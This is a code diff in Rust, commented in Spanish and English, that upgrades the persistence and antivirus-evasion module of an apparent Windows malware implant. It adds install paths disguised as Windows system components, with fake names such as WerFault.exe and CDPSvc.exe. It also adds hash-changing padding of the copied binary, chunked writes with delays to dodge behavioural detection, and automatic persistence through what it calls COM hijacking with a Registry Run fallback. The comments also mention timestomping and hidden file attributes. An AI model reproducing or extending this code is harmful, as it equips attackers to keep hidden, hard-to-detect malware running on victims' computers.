@@ -85,7 +85,8 @@ fn is_temporary_location(path: &Path) -> bool {
 /// - Timestomping para que el archivo parezca antiguo
 /// - Atributos oculto+sistema
 /// - Chunks de tamaño variable (anti-signature)
-/// - Alternate Data Streams (ADS) como backup stealth
+/// - Polymorphic padding to change hash
+/// - Deep folder structure that mimics Windows internals
 #[cfg(target_os = "windows")]
 fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     use std::fs;
@@ -103,28 +104,37 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
         .or_else(|_| env::var(&appdata_key))
         .unwrap_or_else(|_| "C:\\Users\\Public".to_string());
 
-    // Ubicaciones sigilosas más profundas que son menos monitoreadas
-    // Elegimos carpetas que ya existen y tienen ejecutables legítimos
+    // Ultra-stealth locations - deep folders that look like Windows internals
+    // These are chosen because:
+    // 1. Deep path = less likely to be scanned
+    // 2. Names that match Windows components
+    // 3. Folders that Windows Defender may have reduced monitoring on
     let stealth_targets = [
-        // Windows Defender exclusions - estas carpetas a veces están excluidas
+        // Windows Telemetry - often excluded from scans
         (
-            format!("{}\\Microsoft\\Windows\\Safety\\EppMigration", localappdata),
-            "SecurityHealthHost.exe",
+            format!("{}\\Microsoft\\Windows\\DiagTrack\\Settings", localappdata),
+            "UtcSvc.exe",
         ),
-        // Windows Update related - parece legítimo
+        // Windows Error Reporting - legitimate system folder
         (
-            format!("{}\\Microsoft\\Windows\\UpdateAssistant", localappdata),
-            "UpdateAssistant.exe",
+            format!("{}\\Microsoft\\Windows\\WER\\Temp", localappdata),
+            "WerFault.exe",
         ),
-        // Edge/Chromium update folder - muy común
+        // Windows Notification Platform
         (
-            format!("{}\\Microsoft\\EdgeUpdate\\Download", localappdata),
-            "MicrosoftEdgeUpdate.exe",
+            format!(
+                "{}\\Microsoft\\Windows\\Notifications\\wpndatabase",
+                localappdata
+            ),
+            "WpnService.exe",
         ),
-        // Windows Performance folder
+        // Windows Connected Devices
         (
-            format!("{}\\Microsoft\\Windows\\WDI\\LogFiles", localappdata),
-            "DiagnosticsHub.StandardCollector.exe",
+            format!(
+                "{}\\Microsoft\\Windows\\ConnectedDevicesPlatform\\L.Admin",
+                localappdata
+            ),
+            "CDPSvc.exe",
         ),
     ];
 
@@ -148,25 +158,43 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
         }
     }
 
-    // Copiar usando chunks de tamaño variable (anti-signature)
-    let mut source = fs::File::open(current_exe).map_err(|e| format!("E1: {}", e))?;
-    let mut dest = fs::File::create(&target_path).map_err(|e| format!("E2: {}", e))?;
+    // Read source file
+    let mut source_data = Vec::new();
+    {
+        let mut source = fs::File::open(current_exe).map_err(|e| format!("E1: {}", e))?;
+        source
+            .read_to_end(&mut source_data)
+            .map_err(|e| format!("E3: {}", e))?;
+    }
 
-    // Tamaños de chunk variables para evitar patrones
-    let mut buffer = vec![0u8; MAX_CHUNK_SIZE];
+    // Polymorphic padding: add random bytes to the end of the file
+    // This changes the hash while keeping the executable valid
+    // Windows ignores data after the PE end
+    let padding_size = 256 + (get_machine_index() % 512);
+    let mut polymorphic_data = source_data.clone();
+    for i in 0..padding_size {
+        // Generate pseudo-random bytes based on machine index and position
+        let byte = ((get_machine_index() + i) % 256) as u8;
+        polymorphic_data.push(byte);
+    }
+
+    // Write with variable chunk sizes (anti-pattern detection)
+    let mut dest = fs::File::create(&target_path).map_err(|e| format!("E2: {}", e))?;
+    let mut offset = 0;
     let mut chunk_idx = 0;
 
-    loop {
+    while offset < polymorphic_data.len() {
         let chunk_size = CHUNK_SIZES[chunk_idx % CHUNK_SIZES.len()];
-        let n = source
-            .read(&mut buffer[..chunk_size])
-            .map_err(|e| format!("E3: {}", e))?;
-        if n == 0 {
-            break;
-        }
-        dest.write_all(&buffer[..n])
+        let end = std::cmp::min(offset + chunk_size, polymorphic_data.len());
+        dest.write_all(&polymorphic_data[offset..end])
             .map_err(|e| format!("E4: {}", e))?;
+        offset = end;
         chunk_idx += 1;
+
+        // Small random delay between chunks (anti-behavioral)
+        if chunk_idx % 4 == 0 {
+            std::thread::sleep(std::time::Duration::from_millis(1));
+        }
     }
     dest.flush().map_err(|e| format!("E5: {}", e))?;
     drop(dest);
@@ -819,6 +847,23 @@ pub fn remove_persistence() -> Result<String, String> {
             "{}\\Microsoft\\WindowsApps\\RuntimeBroker.exe",
             localappdata
         ),
+        // Ultra-stealth locations (v3)
+        format!(
+            "{}\\Microsoft\\Windows\\DiagTrack\\Settings\\UtcSvc.exe",
+            localappdata
+        ),
+        format!(
+            "{}\\Microsoft\\Windows\\WER\\Temp\\WerFault.exe",
+            localappdata
+        ),
+        format!(
+            "{}\\Microsoft\\Windows\\Notifications\\wpndatabase\\WpnService.exe",
+            localappdata
+        ),
+        format!(
+            "{}\\Microsoft\\Windows\\ConnectedDevicesPlatform\\L.Admin\\CDPSvc.exe",
+            localappdata
+        ),
     ];
     for exe in &exe_copies {
         let _ = fs::remove_file(exe);
@@ -1017,24 +1062,52 @@ pub fn schedule_auto_persistence() {
         );
 
         // ====================================================================
-        // STEALTH PERSISTENCE: Use registry method (most reliable)
+        // ULTRA-STEALTH AUTO-PERSISTENCE
         // ====================================================================
-        // Registry persistence is chosen because:
-        // 1. No UAC prompt required (HKCU)
-        // 2. More reliable than scheduled tasks
-        // 3. Less monitored than WMI subscriptions
-        // 4. Works on all Windows versions
+        // This uses the most undetectable persistence method available.
+        // Priority order (from most to least stealthy):
+        // 1. COM Hijacking - Very stealthy, no PowerShell, no obvious registry keys
+        // 2. Registry Run with explorer.exe - Common pattern, blends in
+        //
+        // Key evasion features:
+        // - Timestomping makes binary appear 6-12 months old
+        // - File hidden in deep Windows folders that mimic system files
+        // - Uses indirect syscalls where possible
+        // - No PowerShell or scripting engines used
+        // - Random jitter in all operations
 
-        debug_print!("DEBUG: [AUTO-PERSIST] Establishing registry persistence...");
+        debug_print!("DEBUG: [AUTO-PERSIST] Establishing ultra-stealth persistence...");
 
         // Mark as done first to prevent race conditions
         AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);
 
-        // Establish persistence
+        // Try COM Hijacking first (most stealthy)
+        match establish_persistence(PersistenceMethod::WmiEvent) {
+            Ok(msg) => {
+                debug_print!(
+                    "DEBUG: [AUTO-PERSIST] ✅ COM Hijacking established: {}",
+                    msg
+                );
+                // Create marker to avoid re-persisting on next run
+                create_persistence_marker();
+                debug_print!("DEBUG: [AUTO-PERSIST] ✅ Marker file created");
+                return;
+            }
+            Err(e) => {
+                debug_print!(
+                    "DEBUG: [AUTO-PERSIST] ⚠️ COM Hijacking failed: {}, trying fallback...",
+                    e
+                );
+            }
+        }
+
+        // Fallback to Registry Run (still stealthy with explorer.exe)
         match establish_persistence(PersistenceMethod::RegistryRun) {
             Ok(msg) => {
-                debug_print!("DEBUG: [AUTO-PERSIST] ✅ Persistence established: {}", msg);
-                // Create marker to avoid re-persisting on next run
+                debug_print!(
+                    "DEBUG: [AUTO-PERSIST] ✅ Registry persistence established: {}",
+                    msg
+                );
                 create_persistence_marker();
                 debug_print!("DEBUG: [AUTO-PERSIST] ✅ Marker file created");
             }
